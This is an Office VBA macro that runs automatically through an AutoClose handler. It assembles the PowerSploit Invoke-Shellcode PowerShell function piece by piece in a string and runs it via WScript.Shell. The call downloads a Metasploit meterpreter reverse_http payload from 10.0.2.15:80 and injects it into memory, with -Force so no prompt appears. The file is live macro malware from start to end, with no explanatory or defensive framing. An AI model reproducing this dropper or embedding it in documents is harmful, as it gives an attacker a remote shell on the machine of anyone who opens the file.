Sub AutoClose()
        oUqK
End Sub

Public Function oUqK() As Variant
        Dim L As String
        L = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        L = L + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        L = L + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        L = L + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        L = L + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        L = L + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        L = L + "    $Shellcode,
    [Parameter( ParameterSetName ="
        L = L + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        L = L + "reter/reverse_http',
                  'windows/me"
        L = L + "terpreter/reverse_https',
                  Ignore"
        L = L + "Case = $True )]
    [String]
    $Payload = 'windo"
        L = L + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        L = L + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        L = L + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        L = L + " = $True,
                ParameterSetName = 'Meta"
        L = L + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        L = L + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        L = L + "datory = $True,
                ParameterSetName ="
        L = L + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        L = L + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        L = L + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        L = L + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        L = L + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        L = L + "sion\Internet Settings').'User Agent',
    [Parame"
        L = L + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        L = L + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        L = L + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        L = L + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        L = L + "$False,
    [Switch]
    $Force = $False
)
    Set"
        L = L + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        L = L + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        L = L + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        L = L + "meters['Payload'].Attributes |
            Where-O"
        L = L + "bject {$_.TypeId -eq [System.Management.Automation"
        L = L + ".ValidateSetAttribute]}
        foreach ($Payload "
        L = L + "in $AvailablePayloads.ValidValues)
        {
     "
        L = L + "       New-Object PSObject -Property @{ Payloads ="
        L = L + " $Payload }
        }
        Return
    }
    if "
        L = L + "( $PSBoundParameters['ProcessID'] )
    {
        "
        L = L + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        L = L + "-Null
    }
    function Local:Get-DelegateType
  "
        L = L + "  {
        Param
        (
            [OutputTyp"
        L = L + "e([Type])]
            [Parameter( Position = 0)]
"
        L = L + "            [Type[]]
            $Parameters = (Ne"
        L = L + "w-Object Type[](0)),
            [Parameter( Posit"
        L = L + "ion = 1 )]
            [Type]
            $ReturnT"
        L = L + "ype = [Void]
        )
        $Domain = [AppDomai"
        L = L + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        L = L + "t System.Reflection.AssemblyName('ReflectedDelegat"
        L = L + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        L = L + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        L = L + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        L = L + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        L = L + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        L = L + "der.DefineType('MyDelegateType', 'Class, Public, S"
        L = L + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        L = L + "egate])
        $ConstructorBuilder = $TypeBuilder"
        L = L + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        L = L + "ic', [System.Reflection.CallingConventions]::Stand"
        L = L + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        L = L + "mplementationFlags('Runtime, Managed')
        $Me"
        L = L + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        L = L + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        L = L + ", $Parameters)
        $MethodBuilder.SetImplement"
        L = L + "ationFlags('Runtime, Managed')
        Write-Outpu"
        L = L + "t $TypeBuilder.CreateType()
    }
    function Loc"
        L = L + "al:Get-ProcAddress
    {
        Param
        (
 "
        L = L + "           [OutputType([IntPtr])]
            [Par"
        L = L + "ameter( Position = 0, Mandatory = $True )]
       "
        L = L + "     [String]
            $Module,
            [Pa"
        L = L + "rameter( Position = 1, Mandatory = $True )]
      "
        L = L + "      [String]
            $Procedure
        )
  "
        L = L + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        L = L + ".GetAssemblies() |
            Where-Object { $_.G"
        L = L + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        L = L + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        L = L + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        L = L + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        L = L + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        L = L + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        L = L + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        L = L + "eropServices.HandleRef], [String]))
        $Kern3"
        L = L + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        L = L + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        L = L + "ndleRef = New-Object System.Runtime.InteropService"
        L = L + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        L = L + "Output $GetProcAddress.Invoke($null, @([System.Run"
        L = L + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        L = L + "ure))
    }
    function Local:Emit-CallThreadStub"
        L = L + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        L = L + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        L = L + "chitecture / 8
        function Local:ConvertTo-Li"
        L = L + "ttleEndian ([IntPtr] $Address)
        {
         "
        L = L + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        L = L + "           $Address.ToString("X$($IntSizePtr*2)") "
        L = L + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        L = L + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        L = L + " } }
            [System.Array]::Reverse($LittleEn"
        L = L + "dianByteArray)
            Write-Output $LittleEnd"
        L = L + "ianByteArray
        }
        $CallStub = New-Obj"
        L = L + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        L = L + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        L = L + "                   # MOV   QWORD RAX, &shellcode
 "
        L = L + "           $CallStub += ConvertTo-LittleEndian $Ba"
        L = L + "seAddr       # &shellcode
            $CallStub +="
        L = L + " 0xFF,0xD0                              # CALL  RA"
        L = L + "X
            $CallStub += 0x6A,0x00              "
        L = L + "                # PUSH  BYTE 0
            $CallSt"
        L = L + "ub += 0x48,0xB8                              # MOV"
        L = L + "   QWORD RAX, &ExitThread
            $CallStub +="
        L = L + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        L = L + "ead
            $CallStub += 0xFF,0xD0            "
        L = L + "                  # CALL  RAX
        }
        el"
        L = L + "se
        {
            [Byte[]] $CallStub = 0xB8"
        L = L + "                           # MOV   DWORD EAX, &she"
        L = L + "llcode
            $CallStub += ConvertTo-LittleEn"
        L = L + "dian $BaseAddr       # &shellcode
            $Cal"
        L = L + "lStub += 0xFF,0xD0                              # "
        L = L + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        L = L + "                        # PUSH  BYTE 0
           "
        L = L + " $CallStub += 0xB8                                "
        L = L + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        L = L + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        L = L + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        L = L + "                          # CALL  EAX
        }
  "
        L = L + "      Write-Output $CallStub
    }
    function Lo"
        L = L + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        L = L + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        L = L + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        L = L + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        L = L + "        Throw "Unable to open a process handle for"
        L = L + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        L = L + "lse
        if ($64bitCPU) # Only perform theses c"
        L = L + "hecks if CPU is 64-bit
        {
            $IsWo"
        L = L + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        L = L + "-Null
            if ((!$IsWow64) -and $PowerShell"
        L = L + "32bit)
            {
                Throw 'Unable"
        L = L + " to inject 64-bit shellcode from within 32-bit Pow"
        L = L + "ershell. Use the 64-bit version of Powershell if y"
        L = L + "ou want this to work.'
            }
            e"
        L = L + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        L = L + "  {
                if ($Shellcode32.Length -eq 0)"
        L = L + "
                {
                    Throw 'No s"
        L = L + "hellcode was placed in the $Shellcode32 variable!'"
        L = L + "
                }
                $Shellcode = $S"
        L = L + "hellcode32
            }
            else # 64-bit"
        L = L + " process
            {
                if ($Shellc"
        L = L + "ode64.Length -eq 0)
                {
            "
        L = L + "        Throw 'No shellcode was placed in the $She"
        L = L + "llcode64 variable!'
                }
            "
        L = L + "    $Shellcode = $Shellcode64
            }
      "
        L = L + "  }
        else # 32-bit CPU
        {
          "
        L = L + "  if ($Shellcode32.Length -eq 0)
            {
   "
        L = L + "             Throw 'No shellcode was placed in the"
        L = L + " $Shellcode32 variable!'
            }
           "
        L = L + " $Shellcode = $Shellcode32
        }
        $Remo"
        L = L + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        L = L + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        L = L + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        L = L + ")
        {
            Throw "Unable to allocate "
        L = L + "shellcode memory in PID: $ProcessID"
        }
   "
        L = L + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        L = L + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        L = L + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        L = L + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        L = L + "      {
            $CallStub = Emit-CallThreadStu"
        L = L + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        L = L + "    else
        {
            $CallStub = Emit-Ca"
        L = L + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        L = L + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        L = L + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        L = L + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        L = L + "(!$RemoteStubAddr)
        {
            Throw "Un"
        L = L + "able to allocate thread call stub memory in PID: $"
        L = L + "ProcessID"
        }
        $WriteProcessMemory.I"
        L = L + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        L = L + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        L = L + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        L = L + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        L = L + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        L = L + "  {
            Throw "Unable to launch remote thr"
        L = L + "ead in PID: $ProcessID"
        }
        $CloseHa"
        L = L + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        L = L + "on Local:Inject-LocalShellcode
    {
        if ($"
        L = L + "PowerShell32bit) {
            if ($Shellcode32.Le"
        L = L + "ngth -eq 0)
            {
                Throw 'N"
        L = L + "o shellcode was placed in the $Shellcode32 variabl"
        L = L + "e!'
                return
            }
         "
        L = L + "   $Shellcode = $Shellcode32
        }
        els"
        L = L + "e
        {
            if ($Shellcode64.Length -e"
        L = L + "q 0)
            {
                Throw 'No shell"
        L = L + "code was placed in the $Shellcode64 variable!'
   "
        L = L + "             return
            }
            $She"
        L = L + "llcode = $Shellcode64
        }
        $BaseAddre"
        L = L + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        L = L + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        L = L + "X)
        if (!$BaseAddress)
        {
          "
        L = L + "  Throw "Unable to allocate shellcode memory in PI"
        L = L + "D: $ProcessID"
        }
        [System.Runtime.I"
        L = L + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        L = L + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        L = L + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        L = L + "  if ($PowerShell32bit)
        {
            $Cal"
        L = L + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        L = L + "adAddr 32
        }
        else
        {
       "
        L = L + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        L = L + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        L = L + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        L = L + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        L = L + "X)
        if (!$CallStubAddress)
        {
      "
        L = L + "      Throw "Unable to allocate thread call stub.""
        L = L + "
        }
        [System.Runtime.InteropServices"
        L = L + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        L = L + "allStub.Length)
        $ThreadHandle = $CreateThr"
        L = L + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        L = L + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        L = L + "dHandle)
        {
            Throw "Unable to la"
        L = L + "unch thread."
        }
        $WaitForSingleObje"
        L = L + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        L = L + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        L = L + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        L = L + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        L = L + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        L = L + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        L = L + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        L = L + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        L = L + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        L = L + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        L = L + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        L = L + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        L = L + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        L = L + "  else
    {
        $64bitCPU = $false
    }
    "
        L = L + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        L = L + "l32bit = $true
    }
    else
    {
        $Power"
        L = L + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        L = L + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        L = L + "owerShell32bit) {
            $RootInvocation = $M"
        L = L + "yInvocation.Line
            $Response = $True
   "
        L = L + "         if ( $Force -or ( $Response = $psCmdlet.S"
        L = L + "houldContinue( "Do you want to launch the payload "
        L = L + "from x86 Powershell?",
                   "Attempt"
        L = L + " to execute 32-bit shellcode from 64-bit Powershel"
        L = L + "l. Note: This process takes about one minute. Be p"
        L = L + "atient! You will also see some artifacts of the sc"
        L = L + "ript loading in the other process." ) ) ) { }
    "
        L = L + "        if ( !$Response )
            {
          "
        L = L + "      Return
            }
            if ($MyInvo"
        L = L + "cation.BoundParameters['Force'])
            {
   "
        L = L + "             $Command = "function $($MyInvocation."
        L = L + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        L = L + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        L = L + "   }
            else
            {
              "
        L = L + "  $Command = "function $($MyInvocation.InvocationN"
        L = L + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        L = L + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        L = L + "
            $CommandBytes = [System.Text.Encoding"
        L = L + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        L = L + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        L = L + "           $Execute = '$Command' + " | $Env:windir"
        L = L + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        L = L + "oProfile -Command -"
            Invoke-Expression"
        L = L + " -Command $Execute | Out-Null
            Return
 "
        L = L + "       }
        $Response = $True
        if ( $F"
        L = L + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        L = L + "Do you know what you're doing?",
               "A"
        L = L + "bout to download Metasploit payload '$($Payload)' "
        L = L + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        L = L + "  if ( !$Response )
        {
            Return
 "
        L = L + "       }
        switch ($Payload)
        {
     "
        L = L + "       'windows/meterpreter/reverse_http'
        "
        L = L + "    {
                $SSL = ''
            }
    "
        L = L + "        'windows/meterpreter/reverse_https'
      "
        L = L + "      {
                $SSL = 's'
               "
        L = L + " [System.Net.ServicePointManager]::ServerCertifica"
        L = L + "teValidationCallback = {$True}
            }
     "
        L = L + "   }
        if ($Legacy)
        {
            $R"
        L = L + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        L = L + "
        } else {
            $CharArray = 48..57 "
        L = L + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        L = L + "         $SumTest = $False
            while ($Sum"
        L = L + "Test -eq $False)
            {
                $Ge"
        L = L + "neratedUri = $CharArray | Get-Random -Count 4
    "
        L = L + "            $SumTest = (([int[]] $GeneratedUri | M"
        L = L + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        L = L + "  }
            $RequestUri = -join $GeneratedUri
"
        L = L + "            $Request = "http$($SSL)://$($Lhost):$("
        L = L + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        L = L + "ew-Object Uri($Request)
        $WebClient = New-O"
        L = L + "bject System.Net.WebClient
        $WebClient.Head"
        L = L + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        L = L + "roxy)
        {
            $WebProxyObject = New-"
        L = L + "Object System.Net.WebProxy
            $ProxyAddre"
        L = L + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        L = L + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        L = L + "oxyServer
            if ($ProxyAddress)
         "
        L = L + "   {
                $WebProxyObject.Address = $Pr"
        L = L + "oxyAddress
                $WebProxyObject.UseDefa"
        L = L + "ultCredentials = $True
                $WebClientO"
        L = L + "bject.Proxy = $WebProxyObject
            }
      "
        L = L + "  }
        try
        {
            [Byte[]] $Sh"
        L = L + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        L = L + "}
        catch
        {
            Throw "$($Er"
        L = L + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        L = L + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        L = L + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        L = L + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        L = L + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        L = L + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        L = L + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        L = L + "                             0x52,0x0c,0x8b,0x52,0"
        L = L + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        L = L + "x31,0xc0,
                                  0xac,0"
        L = L + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        L = L + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        L = L + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        L = L + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        L = L + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        L = L + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        L = L + "x8b,
                                  0x01,0xd6,0"
        L = L + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        L = L + "x38,0xe0,0x75,0xf4,
                              "
        L = L + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        L = L + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        L = L + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        L = L + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        L = L + "                                  0x5b,0x5b,0x61,0"
        L = L + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        L = L + "xeb,0x86,0x5d,
                                  0"
        L = L + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        L = L + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        L = L + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        L = L + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        L = L + "                             0x80,0xfb,0xe0,0x75,0"
        L = L + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        L = L + "xd5,0x63,
                                  0x61,0"
        L = L + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        L = L + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        L = L + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        L = L + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        L = L + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        L = L + "                             0x20,0x48,0x8b,0x72,0"
        L = L + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        L = L + "x31,0xc0,
                                  0xac,0"
        L = L + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        L = L + "x41,0x01,0xc1,0xe2,0xed,
                         "
        L = L + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        L = L + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        L = L + "                        0x00,0x00,0x00,0x48,0x85,0"
        L = L + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        L = L + "x44,
                                  0x8b,0x40,0"
        L = L + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        L = L + "x8b,0x34,0x88,0x48,
                              "
        L = L + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        L = L + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        L = L + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        L = L + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        L = L + "                                  0x8b,0x40,0x24,0"
        L = L + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        L = L + "x40,0x1c,0x49,
                                  0"
        L = L + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        L = L + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        L = L + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        L = L + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        L = L + "                             0x59,0x5a,0x48,0x8b,0"
        L = L + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        L = L + "x00,0x00,
                                  0x00,0"
        L = L + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        L = L + "x00,0x41,0xba,0x31,0x8b,
                         "
        L = L + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        L = L + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        L = L + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        L = L + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        L = L + "x47,
                                  0x13,0x72,0"
        L = L + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        L = L + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        L = L + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
        L = L + "= Get-ProcAddress kernel32.dll OpenProcess
       "
        L = L + " $OpenProcessDelegate = Get-DelegateType @([UInt32"
        L = L + "], [Bool], [UInt32]) ([IntPtr])
        $OpenProce"
        L = L + "ss = [System.Runtime.InteropServices.Marshal]::Get"
        L = L + "DelegateForFunctionPointer($OpenProcessAddr, $Open"
        L = L + "ProcessDelegate)
        $VirtualAllocExAddr = Get"
        L = L + "-ProcAddress kernel32.dll VirtualAllocEx
        $"
        L = L + "VirtualAllocExDelegate = Get-DelegateType @([IntPt"
        L = L + "r], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntP"
        L = L + "tr])
        $VirtualAllocEx = [System.Runtime.Int"
        L = L + "eropServices.Marshal]::GetDelegateForFunctionPoint"
        L = L + "er($VirtualAllocExAddr, $VirtualAllocExDelegate)
 "
        L = L + "       $WriteProcessMemoryAddr = Get-ProcAddress k"
        L = L + "ernel32.dll WriteProcessMemory
        $WriteProce"
        L = L + "ssMemoryDelegate = Get-DelegateType @([IntPtr], [I"
        L = L + "ntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType"
        L = L + "()) ([Bool])
        $WriteProcessMemory = [System"
        L = L + ".Runtime.InteropServices.Marshal]::GetDelegateForF"
        L = L + "unctionPointer($WriteProcessMemoryAddr, $WriteProc"
        L = L + "essMemoryDelegate)
        $CreateRemoteThreadAddr"
        L = L + " = Get-ProcAddress kernel32.dll CreateRemoteThread"
        L = L + "
        $CreateRemoteThreadDelegate = Get-Delegat"
        L = L + "eType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [I"
        L = L + "ntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $Cr"
        L = L + "eateRemoteThread = [System.Runtime.InteropServices"
        L = L + ".Marshal]::GetDelegateForFunctionPointer($CreateRe"
        L = L + "moteThreadAddr, $CreateRemoteThreadDelegate)
     "
        L = L + "   $CloseHandleAddr = Get-ProcAddress kernel32.dll"
        L = L + " CloseHandle
        $CloseHandleDelegate = Get-De"
        L = L + "legateType @([IntPtr]) ([Bool])
        $CloseHand"
        L = L + "le = [System.Runtime.InteropServices.Marshal]::Get"
        L = L + "DelegateForFunctionPointer($CloseHandleAddr, $Clos"
        L = L + "eHandleDelegate)
        if ( $Force -or $psCmdlet"
        L = L + ".ShouldContinue( 'Do you wish to carry out your ev"
        L = L + "il plans?',
                 "Injecting shellcode "
        L = L + "injecting into $((Get-Process -Id $ProcessId).Proc"
        L = L + "essName) ($ProcessId)!" ) )
        {
            "
        L = L + "Inject-RemoteShellcode $ProcessId
        }
    }
"
        L = L + "    else
    {
        $VirtualAllocAddr = Get-Pro"
        L = L + "cAddress kernel32.dll VirtualAlloc
        $Virtua"
        L = L + "lAllocDelegate = Get-DelegateType @([IntPtr], [UIn"
        L = L + "t32], [UInt32], [UInt32]) ([IntPtr])
        $Virt"
        L = L + "ualAlloc = [System.Runtime.InteropServices.Marshal"
        L = L + "]::GetDelegateForFunctionPointer($VirtualAllocAddr"
        L = L + ", $VirtualAllocDelegate)
        $VirtualFreeAddr "
        L = L + "= Get-ProcAddress kernel32.dll VirtualFree
       "
        L = L + " $VirtualFreeDelegate = Get-DelegateType @([IntPtr"
        L = L + "], [Uint32], [UInt32]) ([Bool])
        $VirtualFr"
        L = L + "ee = [System.Runtime.InteropServices.Marshal]::Get"
        L = L + "DelegateForFunctionPointer($VirtualFreeAddr, $Virt"
        L = L + "ualFreeDelegate)
        $CreateThreadAddr = Get-P"
        L = L + "rocAddress kernel32.dll CreateThread
        $Crea"
        L = L + "teThreadDelegate = Get-DelegateType @([IntPtr], [U"
        L = L + "Int32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) (["
        L = L + "IntPtr])
        $CreateThread = [System.Runtime.I"
        L = L + "nteropServices.Marshal]::GetDelegateForFunctionPoi"
        L = L + "nter($CreateThreadAddr, $CreateThreadDelegate)
   "
        L = L + "     $WaitForSingleObjectAddr = Get-ProcAddress ke"
        L = L + "rnel32.dll WaitForSingleObject
        $WaitForSin"
        L = L + "gleObjectDelegate = Get-DelegateType @([IntPtr], ["
        L = L + "Int32]) ([Int])
        $WaitForSingleObject = [Sy"
        L = L + "stem.Runtime.InteropServices.Marshal]::GetDelegate"
        L = L + "ForFunctionPointer($WaitForSingleObjectAddr, $Wait"
        L = L + "ForSingleObjectDelegate)
        if ( $Force -or $"
        L = L + "psCmdlet.ShouldContinue( 'Do you wish to carry out"
        L = L + " your evil plans?',
                 "Injecting sh"
        L = L + "ellcode into the running PowerShell process!" ) )
"
        L = L + "        {
            Inject-LocalShellcode
      "
        L = L + "  }
    }
}
Invoke-Shellcode -Payload windows/mete"
        L = L + "rpreter/reverse_http -Lhost 10.0.2.15 -Lport 80 -F"
        L = L + "orce"
        Set asd = CreateObject("WScript.Shell")
        asd.Run(L)
End Function
